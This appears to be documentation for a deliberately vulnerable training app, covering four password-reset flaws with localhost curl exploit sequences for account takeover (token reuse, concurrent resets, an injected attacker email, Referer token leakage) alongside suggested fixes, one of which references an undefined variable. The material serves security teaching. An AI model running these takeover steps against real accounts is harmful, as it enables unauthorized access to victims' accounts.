# Password Reset Vulnerabilities

> [!CAUTION]
> **CRITICAL SECURITY VULNERABILITIES** - Based on HackerOne reports and OWASP research. For educational purposes only.

## Overview

Implemented **4 password reset vulnerabilities** based on actual bug bounty reports. These demonstrate how attackers can exploit password reset mechanisms for account takeover.

---

## Vulnerabilities

### 1. Multiple Valid Reset Tokens

**Severity**: Critical  
**Source**: HackerOne Password Reset Reports

**Vulnerability**: Multiple password reset tokens remain valid simultaneously. Old tokens not invalidated when new ones are generated.

**Exploitation**:
```bash
# 1. Request password reset (Token 1)
curl -X POST http://localhost:3000/api/additional-auth/request-password-reset-multiple \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}'
# Response: {"token":"abc123..."}

# 2. Request again (Token 2)
curl -X POST http://localhost:3000/api/additional-auth/request-password-reset-multiple \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}'
# Response: {"token":"def456..."}

# 3. Use Token1 (older token still valid!)
curl -X POST http://localhost:3000/api/additional-auth/reset-password-race-condition \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","token":"abc123...","newPassword":"hacked"}'
# Success! Old token still works
```

**Impact**: Extended attack window, token theft exploitation.

**Secure Implementation**:
```typescript
export const requestPasswordResetSecure = async (req: Request, res: Response) => {
    const { email } = req.body;
    
    const token = crypto.randomBytes(32).toString('hex');
    
    // Invalidate ALL previous tokens for this user
    delete passwordResetTokens[email];
    
    // Store only the new token
    passwordResetTokens[email] = [{
        token,
        expires: Date.now() + 15 * 60 * 1000
    }];
    
    await sendResetEmail(email, token);
};
```

---

### 2. Password Reset Race Condition

**Severity**: High  
**Source**: HackerOne & Medium Reports

**Vulnerability**: Concurrent password reset requests can be exploited due to lack of concurrency control.

**Exploitation**:
```bash
# 1. Get reset token
TOKEN="abc123..."

# 2. Send multiple concurrent reset requests
for i in {1..10}; do
  curl -X POST http://localhost:3000/api/additional-auth/reset-password-race-condition \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@test.com\",\"token\":\"$TOKEN\",\"newPassword\":\"hacked$i\"}" &
done

# Race condition allows multiple password changes
# Last request wins, but tokens may remain valid
```

**Impact**: Password reset bypass, account takeover.

**Secure Implementation**:
```typescript
const resetLocks: { [email: string]: boolean } = {};

export const resetPasswordSecure = async (req: Request, res: Response) => {
    const { email, token, newPassword } = req.body;
    
    // Acquire lock
    if (resetLocks[email]) {
        return res.status(429).json({ message: 'Reset in progress' });
    }
    
    resetLocks[email] = true;
    
    try {
        // Validate token
        const validToken = passwordResetTokens[email]?.find(t => t.token === token);
        if (!validToken || validToken.expires < Date.now()) {
            return res.status(400).json({ message: 'Invalid or expired token' });
        }
        
        // Reset password
        await prisma.user.update({
            where: { email },
            data: { password: await bcrypt.hash(newPassword, 10) }
        });
        
        // Invalidate ALL tokens
        delete passwordResetTokens[email];
        
        res.json({ message: 'Password reset successful' });
    } finally {
        delete resetLocks[email];
    }
};
```

---

### 3. 0-Click Account Takeover via Reset Flaw

**Severity**: Critical  
**Source**: HackerOne #2024 Critical ATO Report

**Vulnerability**: Race condition in password reset sends token to both victim and attacker emails.

**Exploitation**:
```bash
# 1. Exploit timing flaw in forgot-password endpoint
curl -X POST http://localhost:3000/api/additional-auth/forgot-password-0click \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","attackerEmail":"attacker@test.com"}'

# Response shows token sent to BOTH emails!
# {"sentTo":["victim@test.com","attacker@test.com"],"token":"xyz789..."}

# 2. Attacker uses token to reset password
curl -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","token":"xyz789...","newPassword":"pwned"}'

# Account taken over without victim interaction!
```

**Impact**: 0-click account takeover, no user interaction required.

**Secure Implementation**:
```typescript
export const forgotPasswordSecure = async (req: Request, res: Response) => {
    const { email } = req.body;
    
    // ONLY accept email parameter
    // Reject any additional parameters
    const allowedKeys = ['email'];
    const extraKeys = Object.keys(req.body).filter(k => !allowedKeys.includes(k));
    
    if (extraKeys.length > 0) {
        return res.status(400).json({ message: 'Invalid parameters' });
    }
    
    const user = await prisma.user.findUnique({ where: { email } });
    if (!user) {
        // Don't reveal if email exists
        return res.json({ message: 'If email exists, reset link sent' });
    }
    
    const token = crypto.randomBytes(32).toString('hex');
    
    // Send ONLY to the requested email
    await sendResetEmail(email, token);
    
    res.json({ message: 'Reset link sent' });
};
```

---

### 4. Password Reset Token in URL (Referer Leakage)

**Severity**: High  
**Source**: OWASP Best Practices

**Vulnerability**: Reset token in URL query parameters leaks via Referer header when user clicks external links.

**Exploitation**:
```bash
# 1. Victim receives reset link
# https://app.com/reset?token=secret_token_123

# 2. Victim clicks link, lands on reset page

# 3. Reset page contains external links (analytics, CDN, social media)
# <img src="https://analytics.com/pixel.gif">
# <script src="https://cdn.com/script.js"></script>

# 4. Browser sends Referer header to external sites
# Referer: https://app.com/reset?token=secret_token_123

# 5. Attacker's server logs Referer header
# Token leaked!

# 6. Attacker uses token
curl -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","token":"secret_token_123","newPassword":"hacked"}'
```

**Impact**: Token leakage, account takeover.

**Secure Implementation**:
```typescript
// Option 1: Token in POST body, not URL
export const resetPasswordPageSecure = async (req: Request, res: Response) => {
    // Show reset form WITHOUT token in URL
    res.send(`
        <form method="POST" action="/api/auth/reset-password">
            <input type="hidden" name="token" value="${tokenFromEmail}">
            <input type="password" name="newPassword" required>
            <button type="submit">Reset Password</button>
        </form>
    `);
};

// Option 2: Use Referrer-Policy header
app.use((req, res, next) => {
    res.setHeader('Referrer-Policy', 'no-referrer');
    next();
});

// Option 3: Token in fragment (#), not query (?)
// https://app.com/reset#token=secret_token_123
// Fragments are never sent in Referer header
```

---

## API Endpoints

| Endpoint | Method | Vulnerability |
|----------|--------|---------------|
| `/api/additional-auth/request-password-reset-multiple` | POST | Multiple valid tokens |
| `/api/additional-auth/reset-password-race-condition` | POST | Race condition |
| `/api/additional-auth/forgot-password-0click` | POST | 0-click ATO |
| `/api/additional-auth/reset-password-url-token` | POST | Token in URL |

---

## Testing Checklist

- [ ] Test multiple reset tokens validity
- [ ] Test concurrent password reset requests
- [ ] Test 0-click ATO with multiple emails
- [ ] Test token leakage via Referer header

---

## Secure Implementation Best Practices

1. **Token Management**
   - Invalidate all previous tokens when new one generated
   - Use cryptographically secure random tokens (32+ bytes)
   - Implement short expiration (15-30 minutes)
   - One-time use only

2. **Concurrency Control**
   - Implement locking mechanisms
   - Use database transactions
   - Prevent race conditions
   - Validate state before and after operations

3. **Token Delivery**
   - Never include tokens in URL query parameters
   - Use POST body or URL fragments
   - Implement Referrer-Policy: no-referrer
   - Avoid external resources on reset pages

4. **Input Validation**
   - Strictly validate all parameters
   - Reject unexpected parameters
   - Prevent parameter pollution
   - Sanitize all inputs

5. **Rate Limiting**
   - Limit reset requests per email (3-5 per hour)
   - Limit reset requests per IP
   - Implement CAPTCHA after threshold
   - Log suspicious activity

6. **Notifications**
   - Send notification to old email when password changed
   - Include account recovery options
   - Log all password changes
   - Allow users to see recent security events

---

## References

- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [HackerOne Password Reset Reports](https://hackerone.com/reports?q=password+reset)
- [Referer Header Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)
